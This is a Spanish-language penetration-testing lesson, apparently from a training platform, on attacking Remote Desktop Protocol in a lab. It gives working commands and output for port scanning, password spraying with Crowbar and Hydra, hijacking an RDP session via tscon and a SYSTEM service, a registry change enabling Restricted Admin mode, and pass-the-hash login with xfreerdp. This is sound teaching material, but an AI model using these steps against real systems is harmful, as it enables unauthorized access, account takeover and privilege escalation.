[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) es un protocolo propietario desarrollado por Microsoft que proporciona una interfaz gráfica al usuario para conectarse a otra computadora a través de una conexión de red. También es una de las herramientas de administración más populares, permitiendo a los administradores del sistema controlar centralmente sus sistemas remotos con la misma funcionalidad que si estuvieran en el sitio. Además, los proveedores de servicios gestionados (MSPs) a menudo utilizan esta herramienta para gestionar cientos de redes y sistemas de clientes. Desafortunadamente, aunque RDP facilita en gran medida la administración remota de sistemas informáticos distribuidos, también crea otra puerta de entrada para los ataques.

Por defecto, RDP utiliza el puerto `TCP/3389`. Usando `Nmap`, podemos identificar el servicio RDP disponible en el host objetivo:

```r
nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

---

## Misconfigurations

Dado que RDP utiliza credenciales de usuario para la autenticación, un vector de ataque común contra el protocolo RDP es el adivinamiento de contraseñas. Aunque no es común, podríamos encontrar un servicio RDP sin contraseña si hay una configuración incorrecta.

Una advertencia sobre el adivinamiento de contraseñas en instancias de Windows es que se debe considerar la política de contraseñas del cliente. En muchos casos, una cuenta de usuario se bloqueará o deshabilitará después de un cierto número de intentos de inicio de sesión fallidos. En este caso, podemos realizar una técnica específica de adivinamiento de contraseñas llamada `Password Spraying`. Esta técnica funciona intentando una sola contraseña para muchos nombres de usuario antes de probar otra contraseña, teniendo cuidado de evitar el bloqueo de la cuenta.

Usando la herramienta [Crowbar](https://github.com/galkan/crowbar), podemos realizar un ataque de Password Spraying contra el servicio RDP. Como se muestra en el ejemplo a continuación, se probará la contraseña `password123` contra una lista de nombres de usuario en el archivo `usernames.txt`. El ataque encontró las credenciales válidas como `administrator` : `password123` en el host RDP objetivo.

```r
cat usernames.txt 

root
test
user
guest
admin
administrator
```

### Crowbar - RDP Password Spraying

```r
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

También podemos usar `Hydra` para realizar un ataque de Password Spraying RDP.

### Hydra - RDP Password Spraying

```r
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

Podemos conectarnos por RDP al sistema objetivo utilizando el cliente `rdesktop` o el cliente `xfreerdp` con credenciales válidas.

### RDP Login

```r
rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection attempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)

---

## Protocol Specific Attacks

Imaginemos que logramos acceder a una máquina y tenemos una cuenta con privilegios de administrador local. Si un usuario está conectado vía RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remoto del usuario para escalar nuestros privilegios e impersonar la cuenta. En un entorno de Active Directory, esto podría resultar en tomar el control de una cuenta de Domain Admin o aumentar nuestro acceso dentro del dominio.

### RDP Session Hijacking

Como se muestra en el ejemplo a continuación, estamos conectados como el usuario `juurena` (UserID = 2) que tiene privilegios de `Administrator`. Nuestro objetivo es secuestrar al usuario `lewen` (User ID = 4), quien también está conectado vía RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

Para impersonar con éxito a un usuario sin su contraseña, necesitamos tener privilegios de `SYSTEM` y usar el binario de Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) que permite a los usuarios conectarse a otra sesión de escritorio. Funciona especificando qué `SESSION ID` (`4` para la sesión de `lewen` en nuestro ejemplo) nos gustaría conectar a qué nombre de sesión (`rdp-tcp#13`, que es nuestra sesión actual). Por ejemplo, el siguiente comando abrirá una nueva consola como el `SESSION_ID` especificado dentro de nuestra sesión RDP actual:

```r
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Si tenemos privilegios de administrador local, podemos usar varios métodos para obtener privilegios de `SYSTEM`, como [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o [Mimikatz](https://github.com/gentilkiwi/mimikatz). Un truco simple es crear un servicio de Windows que, por defecto, se ejecutará como `Local System` y ejecutará cualquier binario con privilegios de `SYSTEM`. Usaremos el binario de Microsoft [sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). Primero, especificamos el nombre del servicio (`sessionhijack`) y el `binpath`, que es el comando que queremos ejecutar. Una vez que ejecutamos el siguiente comando, se creará un servicio llamado `sessionhijack`.

```r
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc

.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)

Para ejecutar el comando, podemos iniciar el servicio `sessionhijack`:

```r
C:\htb> net start sessionhijack
```

Una vez que el servicio se inicia, aparecerá una nueva terminal con la sesión del usuario `lewen`. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y tal vez tengamos suerte, y el usuario sea miembro del grupo Help Desk con derechos de administrador en muchos hosts o incluso un Domain Admin.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

_Nota: Este método ya no funciona en Server 2019._

---

## RDP Pass-the-Hash (PtH)

Podríamos querer acceder a aplicaciones o software instalados en el sistema Windows de un usuario que solo están disponibles con acceso GUI durante una prueba de penetración. Si tenemos credenciales en texto claro para el usuario objetivo, no será problema conectarnos por RDP al sistema. Sin embargo, ¿qué pasa si solo tenemos el hash NT del usuario obtenido de un ataque de volcado de credenciales como la base de datos [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager), y no pudimos descifrar el hash para revelar la contraseña en texto claro? En algunos casos, podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema objetivo utilizando herramientas como `xfreerdp`.

Hay algunas advertencias para este ataque:

- `Restricted Admin Mode`, que está deshabilitado por defecto, debe estar habilitado en el host objetivo; de lo contrario, se nos presentará el siguiente error:

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Se puede hacer usando el siguiente comando:

### Adding the DisableRestrictedAdmin Registry Key

```r
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Una vez que se agrega la clave de registro, podemos usar `xfreerdp` con la opción `/pth` para obtener acceso RDP:

```r
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>
```

Si funciona, ahora estaremos conectados por RDP como el usuario objetivo sin conocer su contraseña en texto claro.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)

Ten en cuenta que esto no funcionará contra todos los sistemas Windows que encontremos, pero siempre vale la pena intentarlo en una situación en la que tenemos un hash NTLM, sabemos que el usuario tiene derechos de RDP contra una máquina o un conjunto de máquinas, y el acceso GUI nos beneficiaría de alguna manera para cumplir con el objetivo de nuestra evaluación.